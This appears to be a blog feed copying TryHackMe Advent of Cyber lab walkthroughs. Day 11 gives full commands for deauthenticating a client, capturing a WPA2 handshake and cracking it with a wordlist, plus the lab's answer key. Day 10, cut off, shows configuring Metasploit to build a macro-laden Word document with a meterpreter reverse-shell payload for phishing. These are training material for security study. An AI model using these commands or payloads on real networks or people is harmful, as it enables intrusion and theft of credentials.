  <li><strong>Evil twin attack:</strong> In this attack, the attacker creates a fake access point that has a similar name to one of your trusted Wi-Fi access points. Of course, it cannot be the exact same. If the trusted Wi-Fi’s name is “Home_Internet”, the attacker creates a fake Wi-Fi access point named “Home_Internnet” or something similar that is difficult to differentiate. The attack starts with the attacker sending de-authentication packets to all the users connected to their legitimate Wi-Fi access points. The users would face repeated disconnections from the network after this. With frustration, the users are likely to open the Wi-Fi access points list for troubleshooting and will find the attacker’s Wi-Fi with almost similar name and with greater signal strength. They would go to connect it, and once connected, the attacker could see all their traffic to or from the Internet.</li>
  <li><strong>Rogue access point:</strong> This attack’s objective is similar to that of the evil twin attack. In this attack, the attacker sets up an open Wi-Fi access point near or inside the organisation’s physical premises to make it available to users with good signal strength. The users inside the organisation may accidentally join this network if their devices are set to connect automatically to open Wi-Fi. The attacker can intercept all their communication after the users connect to this rogue access point.</li>
  <li><strong>WPS attack:</strong> Wi-Fi Protected Setup (WPS) was created to allow users to connect to their Wi-Fi using an 8-digit PIN without remembering complex passwords. However, this 8-digit PIN is vulnerable in some networks due to its insecure configuration. The attack is made by initiating a WPS handshake with the router and capturing the router’s response, which contains some data related to the PIN and is vulnerable to brute-force attacks. Some of the captured data is brute-forced, and the PIN is successfully extracted along with the Pre-Shared Key (PSK).</li>
  <li><strong>WPA/WPA2 cracking:</strong> Wi-Fi Protected Access (WPA) was created to secure wireless communication. It uses a strong encryption algorithm. However, the security of this protocol is heavily influenced by the length and complexity of the Pre-Shared Key (PSK). While cracking WPA, attackers start by sending de-authentication packets to a legitimate user of the Wi-Fi network. Once the user disconnects, they try to reconnect to the network, and a 4-way handshake with the router takes place during this time. Meanwhile, the attacker turns its adaptor into monitor mode and captures the handshake. After the handshake is captured, the attacker can crack the password by using brute-force or dictionary attacks on the captured handshake file.</li>
</ul>

<p>McSkidy looks to Glitch and asks, <em>“What kind of attack are you thinking of demonstrating Glitch?”</em></p>

<p>Glitch paces back and forth before coming to a sudden stop and says, <em>“Today I will be showing you how the WPA/WPA2 cracking attack works!”</em></p>

<h2 id="wpawpa2-cracking">WPA/WPA2 Cracking</h2>

<p>As mentioned above, WPA/WPA2 cracking begins by listening to Wi-Fi traffic to capture the 4-way handshake between a device and the access point. Since waiting for a device to connect or reconnect can take some time, deauthentication packets are sent to disconnect a client, forcing it to reconnect and initiate a new handshake, which is captured. After the handshake is captured, the attacker can crack the password (<strong>PSK</strong>) by using brute-force or dictionary attacks on the captured handshake file.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-11---Wifi-Animation-2.gif" alt="the attacker's network card listening in monitor mode, to capture a handshake between a device and an access point" /></p>

<p><strong>The 4-way Handshake</strong></p>

<p>The WPA password cracking process involves capturing a Wi-Fi network’s handshake to attempt a PSK (password) decryption. First, an attacker places their wireless adapter into monitor mode to scan for networks, then targets a specific network to capture the 4-way handshake. Once the handshake is captured, the attacker runs a brute-force or dictionary attack using a tool like aircrack-ng to attempt to match a wordlist against the passphrase.</p>

<p>The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right “password” or Pre-Shared Key (PSK) before securely connecting. Here’s a simplified rundown of what happens:</p>

<ul>
  <li><strong>Router sends a challenge:</strong> The router (or access point) sends a challenge” to the client, asking it to prove it knows the network’s password without directly sharing it.</li>
  <li><strong>Client responds with encrypted information:</strong> The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.</li>
  <li><strong>Router verifies and sends confirmation:</strong> If the router sees the client’s response matches what it expects, it knows the client has the right PSK. The router then sends its own confirmation back to the client.</li>
  <li><strong>Final check and connection established:</strong> The client verifies the router’s response, and if everything matches, they finish setting up the secure connection.</li>
</ul>

<p>This handshake doesn’t directly reveal the PSK itself but involves encrypted exchanges that depend on the PSK.</p>

<p><strong>The Vulnerability</strong></p>

<p>The vulnerability lies in the fact that an attacker can capture this 4-way handshake if they’re listening when a device connects. With the handshake data, they can use it as a basis to attempt offline brute-force or dictionary attacks. Essentially, they try different possible passwords and test each one to see if it would produce the captured handshake data, eventually cracking the PSK if they get a match.</p>

<p>The Practical</p>

<p>On our current SSH session, run the command iw dev. This will show any wireless devices and their configuration that we have available for us to use.
Terminal</p>

<p>glitch@wifi:~$ iw dev
phy#2
Interface wlan2
ifindex 5
wdev 0x200000001
addr 02:00:00:00:02:00
type managed
txpower 20.00 dBm</p>

<p>The device/interface wlan2 is available to us, and there are two important details to take away from this output that will be useful to us:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The addr is the MAC/BSSID of our device. BSSID stands for Basic Service Set Identifier, and it's a unique identifier for a wireless device or access point's physical address.
The type is shown as managed. This is the standard mode used by most Wi-Fi devices (like laptops, phones, etc.) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. There is another mode called monitor, which we will discuss shortly.
</code></pre></div></div>

<p>Now, we would like to scan for nearby Wi-Fi networks using our wlan2 device. We can use sudo iw dev wlan2 scan. The dev wlan2 specifies the wireless device you want to work with, and scan tells iw to scan the area for available Wi-Fi networks.
Terminal</p>

<p>glitch@wifi:~$ sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
last seen: 520.388s [boottime]
TSF: 1730575383370084 usec (20029d, 19:23:03)
freq: 2437
beacon interval: 100 TUs
capability: ESS Privacy ShortSlotTime (0x0411)
signal: -30.00 dBm
last seen: 0 ms ago
Information elements from Probe Response frame:
SSID: MalwareM_AP
Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0
DS Parameter set: channel 6
ERP: Barker_Preamble_Mode
Extended supported rates: 24.0 36.0 48.0 54.0
RSN:	 * Version: 1
* Group cipher: CCMP
* Pairwise ciphers: CCMP
* Authentication suites: PSK
* Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
Supported operating classes:
* current operating class: 81
Extended capabilities:
* Extended Channel Switching
* Operating Mode Notification</p>

<p>There is a lot of information to dissect here, but here are the most important details that indicate this device is an access point:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The BSSID and SSID of the device are 02:00:00:00:00:00 and MalwareM_AP respectively. Since the SSID is shown, this means the device is advertising a network name, which access points do to allow clients to discover and connect to the network.
The presence of RSN (Robust Security Network) indicates the network is using WPA2, as RSN is a part of the WPA2 standard. WPA2 networks typically use RSN to define the encryption and authentication settings.
The Group and Pairwise ciphers are CCMP. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used by WPA2.
The Authentication suites value inside RSN is PSK indicating that this is a WPA2-Personal network, where a shared password is used for authentication.
Another important detail is the DS Parameter set value, which shows channel 6. The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other. There are various Wi-Fi channels, and they all help distribute network traffic across various frequency ranges, which reduces interference. The two most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimising interference. In the 5 GHz band, there are many more channels available, allowing more networks to coexist without interference.
</code></pre></div></div>

<p>Now will be a good time to discuss another type that we can use on some wireless devices: monitor mode. This is a special mode primarily used for network analysis and security auditing. In this mode, the Wi-Fi interface listens to all wireless traffic on a specific channel, regardless of whether it is directed to the device or not. It passively captures all network traffic within range for analysis without joining a network. We want to check if our wlan2 interface can use monitor mode. To achieve this, we will run the command sudo ip link set dev wlan2 down to turn our device off. Then we will switch modes with sudo iw dev wlan2 set type monitor to change wlan2 to monitor mode. Then turn our device back on with sudo ip link set dev wlan2 up.
Terminal</p>

<p>glitch@wifi:~$ sudo ip link set dev wlan2 down
glitch@wifi:~$ sudo iw dev wlan2 set type monitor
glitch@wifi:~$ sudo ip link set dev wlan2 up</p>

<p>We can confirm that our interface is in monitor mode with the command sudo iw dev wlan2 info.
Terminal</p>

<p>glitch@wifi:~$ sudo iw dev wlan2 info
Interface wlan2
ifindex 5
wdev 0x200000001
addr 02:00:00:00:02:00
type monitor
wiphy 2
channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
txpower 20.00 dBm</p>

<p>Now, let us create one more SSH session. We want to have 2 separate terminals in order to see clearly how the attack works. You can align the SSH terminals however you like, but here is an example of how it should look like.</p>

<p>2 terminals with SSH sessions in the AttackBox.</p>

<p>On the first terminal, we start by capturing Wi-Fi traffic in the area, specifically targeting the WPA handshake packets. We can do this with the command sudo airodump-ng wlan2. This command provides a list of nearby Wi-Fi networks (SSIDs) and shows important details like signal strength, channel, and encryption type. This information is already known to us from our previous commands.</p>

<p>Note: By default, airodump-ng will automatically switch the selected wireless interface into monitor mode if the interface supports it.
Terminal</p>

<p>glitch@wifi:~$ sudo airodump-ng wlan2
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28        2        0    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>The output reveals the information we already knew before, such as the BSSID, SSID, and the channel. However, in this particular output, we are also given the channel where our target SSID is listening (channel 6). Now, we will focus on the MalwareM_AP access point and capture the WPA handshake; this is crucial for the PSK (password) cracking process.</p>

<p>First, in the current terminal, let us cancel airodump-ng using CTRL+C and then execute the command sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2. This command targets the specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic and saves the information to a few files that start with the name output-file. These files will be used to crack the PSK. The ultimate goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake. In this particular scenario, a client is already connected. The output will look the same at first until we receive the information about the connected client, which will be displayed at the bottom of our output. It is important to leave this command running until we are done with the attack.
Terminal</p>

<p>glitch@wifi:~$ sudo airodump-ng -c 6 –bssid 02:00:00:00:00:00 -w output-file wlan2
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>It should take between 1 to 5 minutes before receiving the client information. In our case, it will show like this:
Terminal</p>

<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140</p>

<p>Note that the STATION section shows the device’s BSSID (MAC) of 02:00:00:00:01:00 that is connected to the access point. This is the connection that we will be attacking. Now we are ready for the next step.</p>

<p>On the second terminal, we will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets. We can break this down into 3 simple steps:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Deauthentication packets: The tool aireplay-ng sends deauthentication packets to either a specific client (targeted attack) or to all clients connected to an access point (broadcast attack). These packets are essentially "disconnect" commands that force the client to drop its current Wi-Fi connection.
Forcing a reconnection: When the client is disconnected, it automatically tries to reconnect to the Wi-Fi network. During this reconnection, the client and access point perform the 4-way handshake as part of the reauthentication process.
Capturing the handshake: This is where airodump-ng comes into play because it will capture this handshake as it happens, providing the data needed to attempt the WPA/WPA2 cracking.
</code></pre></div></div>

<p>We can do this with sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2. The -0 flag indicates that we are using the deauthentication attack, and the 1 value is the number of deauths to send. The -a indicates the BSSID of the access point and -c indicates the BSSID of the client to deauthenticate.
Terminal</p>

<p>glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]</p>

<p>Now, if we look back on our first terminal, we will see the WPA handshake shown on the top-right of our output as WPA handshake: 02:00:00:00:00:00. All of this information is being saved into our output files.
Terminal</p>

<p>CH  6 ][ Elapsed: 1 min ][ 2024-11-02 19:30 ][ WPA handshake: 02:00:00:00:00:00</p>

<p>BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</p>

<p>02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP</p>

<p>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</p>

<p>02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140  EAPOL</p>

<p>In the second terminal, we can use the captured WPA handshake to attempt to crack the WPA/WP2 passphrase. We will be performing a dictionary attack in order to match the passphrase against each entry in a specified wordlist file. A shortened version of the infamous rockyou.txt wordlist has already been provided for us to use. This is located in the /home/glitch/ directory. If the passphrase is weak and appears in the wordlist, it will eventually be cracked. The command sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap will do this for us where the -a 2 flag indicates the WPA/WPA2 attack mode. The -b indicates the BSSID of the access point, and the -w flag indicates the dictionary list to use for the attack. Finally, we select the output files that we will be using, which contain the 4-way handshake that we will be cracking.
Terminal</p>

<p>glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
Reading packets, please wait…
Opening output-file-01.cap
Read 276 packets.
1 potential targets</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                           Aircrack-ng 1.6

  [00:00:01] 304/513 keys tested (217.04 k/s)

  Time left: 0 seconds                                      59.26%

             KEY FOUND! [ REDACTED ]


  Master Key     : B6 53 9A 71 8C C4 74 5F E3 26 49 82 37 74 65 09
                   BE C5 62 CE 43 C4 68 A7 B4 8F 8C E6 98 EE 1C CB

  Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

  EAPOL HMAC     : C8 8E D5 F4 B4 5A 1D C4 6C 41 35 07 68 81 79 CD
</code></pre></div></div>

<p>Note: If you get an Packets contained no EAPOL data; unable to process this AP error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all. If that’s the case, then re-do all of the steps in order to capture the WPA handshake.</p>

<p>With the PSK, we can now join the MalwareM_AP access point. In a typical engagement, we would do this to inspect the new network, or in some cases, joining the access point is enough to show impact. First, press CTRL+C on the terminal that has airodump-ng running in order to stop the airodump-ng process. We do this because we will not be able to join the Wi-Fi network while airodump-ng is running due to the fact that we are actively using the interface in monitor mode. Then execute the following commands:
Terminal</p>

<p>glitch@wifi:~$ wpa_passphrase MalwareM_AP ‘ENTER PSK HERE’ &gt; config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2</p>

<p>Note: If you get a rfkill: Cannot get wiphy information error, you can ignore it. You will also notice that wpa_supplicant has automatically switched our wlan2 interface to managed mode.</p>

<p>Giving it about 10 seconds and checking the wireless interfaces once again with iw dev shows that we have joined the MalwareM_AP SSID.</p>

<p>Terminal</p>

<p><code class="language-plaintext highlighter-rouge">glitch@wifi:~$ iw dev phy#2 -- Removed for brevity --</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Interface wlan2
	ifindex 5
	wdev 0x200000001
	addr 02:00:00:00:02:00
	ssid MalwareM_AP
	type managed
	channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
	txpower 20.00 dBm
</code></pre></div></div>

<p>The End</p>

<p>McSkidy looked in awe as Glitch flawlessly exposed a weakness in the Wi-Fi network.</p>

<p>Glitch ponders and says, <em>“That password is pretty weak, I must say. I wouldn’t have been surprised if the Mayor had already found a way.”</em></p>

<p>McSkidy gets to work right away while Glitch thinks about what is next.</p>

<p>Glitch stops and says, <em>“I am ever curious if the Mayor knows much about race conditions and how will that affect us?”</em></p>

<p>Answer the questions below</p>

<p>What is the BSSID of our wireless interface?</p>

<p>02:00:00:00:02:00</p>

<p>What is the SSID and BSSID of the access point? Format: SSID, BSSID</p>

<p>MalwareM_AP, 02:00:00:00:00:00</p>

<p>What is the BSSID of the wireless interface that is already connected to the access point?</p>

<p>02:00:00:00:01:00</p>

<p>What is the PSK after performing the WPA cracking attack?</p>

<p>fluffy/champ24</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/networking">Networking</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day11Header.png" /><media:content medium="image" url="http://localhost:4000/Day11Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 10</title><link href="http://localhost:4000/Day10" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 10" /><published>2024-12-10T00:00:00-05:00</published><updated>2024-12-10T00:00:00-05:00</updated><id>http://localhost:4000/Day10</id><content type="html" xml:base="http://localhost:4000/Day10"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376026704.svg" alt="Task banner for day DAY 10" /></p>

<p>Click here to watch the walkthrough video!</p>

<p><em>Mayor Malware had one, just one SOC-mas wish:</em></p>

<p><em>The SOC organiser would fall for his phish!</em></p>

<p><em>Well on top of this, he wanted as well,</em></p>

<p><em>Once the email opened, to gain a rev shell.</em></p>

<p>\n</p>

<p>Mayor Malware attempts to phish one of the SOC-mas organizers by sending a document embedded with a malicious macro. Once opened, the macro will execute, giving the Mayor remote access to the organizer’s system.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376786068.svg" alt="Mayor Malware attempts to phish one of the SOC-mas organizers." /> \n</p>

<p>Marta May Ware is surprised that her system was compromised even after following tight security, but McSkidy thinks she traced the attacker, and he got in. It’s none other than Mayor Malware who got into the system. This time, the Mayor used phishing to get his victim. McSkidy’s quick incident response prevented significant damage.</p>

<p>In this task, you will run a security assessment against Marta May Ware. The purpose would be to improve her security and raise her cyber security awareness against future attacks.</p>

<p>Glitch is still concerned about any future attack on Marta May Ware and advises McSkidy to run a phishing exercise on her to verify whether she is vigilant about these attacks.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Understand how phishing attacks work</li>
  <li>Discover how macros in documents can be used and abused</li>
  <li>Learn how to carry out a phishing attack with a macro</li>
</ul>

<h2 id="phishingattacks">Phishing Attacks</h2>

<p>Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.</p>

<p>Phishing is a play on the word fishing; however, the attacker is not after seafood. Phishing works by sending a “bait” to a usually large group of target users. Furthermore, the attacker often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.</p>

<p>One might get an email out of nowhere claiming that they are being charged a hefty sum and that they should check the details in the attached file or URL. The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attack control over your system.</p>

<h2 id="macros">Macros</h2>

<p>The needs of MS Office users can be vastly different, and there is no way that a default installation would cater to all of these needs. In particular, some users find themselves repeating the same tasks, such as formatting and inserting text or performing calculations. Consider the example of number-to-words conversion where a number such as “1337” needs to be expressed as “one thousand three hundred thirty-seven”. It would take hours to finish if you have hundreds of numbers to convert. Hence, there is a need for an automated solution to save time and reduce manual effort.</p>

<p>In computing, a macro refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.</p>

<p>To add a macro to an MS Word document for instance, we click on the <strong>View</strong> menu and then select <strong>Macros</strong> as pointed out by 1 and 2 in the screenshot below. We should specify the name of the macro and specify that we want to save it in our current document, as indicated by 3 and 4. Finally, we press the <strong>Create</strong> button.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859866900.png" alt="Adding a macro to an MS Word document" /> \n</p>

<p>Let’s explore one way the attacker could have created an MS Word document with an embedded macro to gain access to Marta’s system.</p>

<h2 id="attack-plan">Attack Plan</h2>

<p>In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:</p>

<ol>
  <li>Create a document with a malicious macro</li>
  <li>Start listening for incoming connections on the attacker’s system</li>
  <li>Email the document and wait for the target user to open it</li>
  <li>The target user opens the document and connects to the attacker’s system</li>
  <li>Control the target user’s system</li>
</ol>

<p>You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.</p>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below: \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731376755339.png" alt="We need to start the AttackBox and the attached VM" /> \n</p>

<p>Press the <strong>Start Machine</strong> button below to prepare the mail server.</p>

<p>Start Machine</p>

<p>Click on the <strong>Start AttackBox</strong> button at the top of the page to follow along with creating this document. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>

<h2 id="attackers-system">Attacker’s System</h2>

<p>On the AttackBox, you need to carry out two steps:</p>

<ul>
  <li>Create a document with an embedded malicious macro</li>
  <li>Listen for incoming connections</li>
</ul>

<h2 id="creating-the-malicious-document">Creating the Malicious Document</h2>

<p>The first step would be to embed a malicious macro within the document. Alternatively, you can use the Metasploit Framework to create such a document, as this would spare us the need for a system with MS Office.</p>

<p>You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell \n</li>
  <li><code class="language-plaintext highlighter-rouge">use exploit/multi/fileformat/office_word_macro</code> specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system, <code class="language-plaintext highlighter-rouge">CONNECTION_IP</code> in this case is the IP of the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on for incoming connections on the AttackBox</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> generates a macro and embeds it in a document</li>
  <li><code class="language-plaintext highlighter-rouge">exit</code> to quit and return to the terminal</li>
</ul>

<p>In the terminal below, you can see the execution of the above steps.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">):</span>

   <span class="nx">Name</span>            <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>            <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">CUSTOMTEMPLATE</span>                   <span class="nx">no</span>        <span class="nx">A</span> <span class="nx">docx</span> <span class="nx">file</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">as</span> <span class="nx">a</span> <span class="nx">template</span> <span class="nx">to</span> <span class="nx">build</span> <span class="nx">the</span> <span class="nx">exploit</span>
   <span class="nx">FILENAME</span>        <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>         <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">Office</span> <span class="nb">document</span> <span class="nx">macro</span> <span class="nf">file </span><span class="p">(</span><span class="nx">docm</span><span class="p">)</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>

   <span class="o">**</span><span class="nx">DisablePayloadHandler</span><span class="p">:</span> <span class="nc">True   </span><span class="p">(</span><span class="nx">no</span> <span class="nx">handler</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">created</span><span class="o">!</span><span class="p">)</span><span class="o">**</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Microsoft</span> <span class="nx">Office</span> <span class="nx">Word</span> <span class="nx">on</span> <span class="nx">Windows</span>


<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

